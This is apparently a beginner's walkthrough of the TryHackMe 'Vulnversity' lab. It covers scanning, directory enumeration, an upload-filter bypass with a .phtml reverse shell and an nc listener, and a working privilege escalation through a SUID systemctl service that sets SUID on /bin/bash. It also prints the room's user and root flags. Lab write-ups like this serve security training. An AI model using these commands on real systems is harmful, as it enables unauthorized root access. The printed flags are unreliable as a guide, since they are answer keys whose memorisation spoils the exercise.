# 🛡️ TryHackMe: Vulnversity – Beginner Friendly Walkthrough

**IP**: `10.10.254.212`
**User**: sivaaditya
**Date**: 26-06-2025

---

## 🧩 Task 1 – Deploy the Machine

* Start the machine in TryHackMe.
* Connect your OpenVPN:

  ```bash
  sudo openvpn yourfile.ovpn
  ```

---

## 🧩 Task 2 – Reconnaissance

### 🔍 Scan with Nmap:

```bash
nmap -sV 10.10.254.212 -vv -oN nmap/initial.txt
```

### ✅ Ports Found:

* 21 – FTP (vsftpd 3.0.5)
* 22 – SSH (OpenSSH 8.2p1)
* 139, 445 – Samba
* 3128 – Squid proxy (4.10)
* 3333 – Apache Web Server (Ubuntu)

### ✅ Answers:

* **Open Ports**: 6
* **Squid Proxy Version**: 4.10
* **-p-400 flag scans**: 400 ports
* **Likely OS**: Ubuntu
* **Web Server Port**: 3333
* **Nmap verbose flag**: `-v`

---

## 🧩 Task 3 – Directory Enumeration

### 📁 Using Gobuster:

```bash
gobuster dir -u http://10.10.254.212:3333 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

### 📂 Important Directories Found:

* `/internal/` – Upload form
* `/index.html`, `/css/`, `/fonts/`, `/js/`, etc.

### ✅ Answer:

* **Upload Form Directory**: `/internal/`

---

## 🧩 Task 4 – Compromising the Web Server

### 🚫 Upload Blocked:

* `.php` file blocked.
* `.phtml` is allowed.

### 🐚 Reverse Shell:

* Created a `.phtml` file using PHP reverse shell.
* Set listener:

```bash
nc -lvnp 1234
```

* Got shell as `www-data`

### 📄 Found User Flag:

```bash
cd /home/bill
cat user.txt
```

* **User Flag**: `8bd7992fbe8a6ad22a63361004cfcedb`
* **Username**: `bill`

---

## 🧩 Task 5 – Privilege Escalation

### 🔎 Find SUID Files:

```bash
find / -perm -u=s -type f 2>/dev/null
```

* **Interesting Binary**: `/bin/systemctl`

### ⚙️ Exploit Systemctl:

```bash
TF=$(mktemp).service
cat <<EOF > $TF
[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target
EOF

/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

### 🔓 Get Root Shell:

```bash
/bin/bash -p
cd /root
cat root.txt
```

* **Root Flag**: `a58ff8579f0a9270368d33a9966c7fd5`

---

## ✅ Summary

* 🔍 Performed service scan with Nmap
* 📂 Discovered upload form using Gobuster
* 🐚 Bypassed upload filter using `.phtml`
* 🧑‍💻 Got reverse shell as `www-data`
* 🔼 Escalated privileges using `systemctl`
* 🏁 Captured user and root flags

---

## 🔗 Room Link

[TryHackMe: Vulnversity](https://tryhackme.com/room/vulnversity)

---

✍️ *Write-up by sivaaditya – 26/06/2025*
